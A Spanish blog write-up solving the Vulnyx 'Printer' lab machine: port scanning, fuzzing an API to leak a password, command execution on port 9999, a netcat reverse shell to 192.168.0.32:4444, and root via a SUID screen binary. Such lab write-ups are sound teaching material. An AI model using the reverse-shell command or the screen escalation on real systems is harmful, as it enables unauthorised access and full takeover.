---
layout      : post
title       : "Printer - Vulnyx"
author      : elc4br4
image       : /assets/images/VULNYX/Printer-Vulnyx/Printer.jpg
optimized_image : /assets/images/VULNYX/Printer-Vulnyx/Printer.jpg
category    : [ Vulnyx ]
tags        : [ Linux, Vulnyx ]
description : En esta ocasión vamos a resolver la máquina nivel Easy Printer de la plataforma Vulnyx.
---

🎩En esta ocasión vamos a resolver la máquina nivel Easy Printer de la plataforma Vulnyx🎩.

**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
2. [Explotación](#explotación).
4. [Escalada de Privilegios](#privesc). 

# Reconocimiento [#](reconocimiento) {#reconocimiento}

Como siempre comenzamos realizando un reconocimiento de puertos abiertos para ver por donde podemos empezar a atacar y ver que tenemos en cada puerto.

Para realizar este reconocimiento usaré la herramienta nmap.

```r
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9999/tcp open  abyss
```

Podemos ver que tenemos los siguientes puertos abiertos, 22 (ssh), 80 (http) y 9999 (abyss).

Pero necesito saber algo más de información sobre estos puertos... por lo que lanzaré de nuevo nmap con otros parámetros para lanzar una serie de scripts de enumeración que me ayuden a obtener más información sobre estos puertos abiertos.

![](/assets/images/VULNYX/Printer-Vulnyx/nmap.png)

Ahora ye podemos ver algo más...

En el puerto 80 tenemos un simple servidor Apache... pero lo más curioso está en el puerto 9999, parece que hay una especie de login... por lo que intento conectarme para ver que hay.

A través de netcat me conecto a este puerto y veo que hay un login, pero se me pide una contraseña que no tengo... por lo que toca buscarla.

![](/assets/images/VULNYX/Printer-Vulnyx/nc1.webp)

Continúo enumerando el puerto 80 (http) donde tenemos un servidor Apache.

Tras acceder no encontré nada útil por lo que decidí fuzzear para buscar rutas dentro del servidor.

Comenzaré usando wfuzz.

![](/assets/images/VULNYX/Printer-Vulnyx/wfuzz1.webp)

Encuentro la ruta `api` por lo que sigo fuzzeando.

![](/assets/images/VULNYX/Printer-Vulnyx/wfuzz2.webp)

Accedo a la ruta `api/printers` y encuentro lo siguiente.

Search for your printer with the following format: printer<id>.<ext>

Tras ver esto ya se que he de hacer, continuar fuzzeando.

Debemos descubrir un número (el id) y su extensión... y para ello usamos de nuevo wfuzz.

Tras probar y probar descubrí que la extensión era .json, por lo que generando un rango de números del 1 a 9999 puedo descubrir el id.

![](/assets/images/VULNYX/Printer-Vulnyx/wfuzz3.webp)

Y tras ir probando 1 a 1 cada `id` descubro esto.

![](/assets/images/VULNYX/Printer-Vulnyx/json.webp)

Encontramos una contraseña...

> "$3cUr3Pr1nT3RP4ZZw0rD"

# Explotación [#](explotación) {#explotación}

Tras obtener la contraseña pruebo a utilizarla para conectarme al puerto 9999.

![](/assets/images/VULNYX/Printer-Vulnyx/nc2.webp)

Tras acceder ejecuto el comando `?` para que me muestre la ayuda para ver todos los parámetros que puedo ejecutar y veo que con el comando exec puedo ejecutar comandos en la misma máquina.

```bash
> exec whoami
printer
> exec id
uid=1000(printer) gid=1000(printer) grupos=1000(printer)
```

Por lo que lo aprovecho para introducir una reverse shell en netcat y ganar acceso a la máquina.

```bash
> exec nc -e /bin/bash 192.168.0.32 4444
```

Y gano acceso a la máquina por fin!

![](/assets/images/VULNYX/Printer-Vulnyx/nc3.webp)

Tras acceder ya puedo leer la flag de usuario y proceder al siguiente paso... escalar privielegios.

# Escalada de Privilegios [#](Escalada de Privilegios) {#privesc}

Primero enumero archivos con permisos 4000.

```bash
printer@printer:/var/spool/lpd$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/screen
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

```bash
printer@printer:/var/spool/lpd$ ls -la /usr/bin/screen
ls -la /usr/bin/screen
-rwsr-xr-x 1 root root 482312 feb 27  2021 /usr/bin/screen
```

Y veo que el binario screen puede servirme para escalar privilegios.

Y es muy sencillo, con screen podemos hacer un attach con el parámetro -x a una sesión o pantalla digamos, que en este caso sería la de root.

De la siguiente forma:

```bash
screen -x root/
```

Y ya nos habremos convertido en root.

![](/assets/images/VULNYX/Printer-Vulnyx/root.webp)



